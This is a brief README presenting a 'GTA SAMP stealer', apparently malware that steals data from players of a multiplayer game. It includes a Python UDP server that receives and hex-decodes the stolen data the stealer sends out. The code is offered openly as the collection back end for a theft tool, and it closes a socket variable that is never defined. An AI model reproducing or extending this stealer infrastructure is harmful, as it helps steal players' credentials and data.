# There is example of GTA SAMP stealer.
---
#### To receive data you need simple UDP server, like this:
```python
import socket

SERVER_ADDRESS = ('127.0.0.1', 8081)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(SERVER_ADDRESS)

while True:
    data = server_socket.recv(1024)
    if not data:
        break

    data = bytes.fromhex(data.decode()).decode('utf-8')
    print(data)
  
sock.close()
```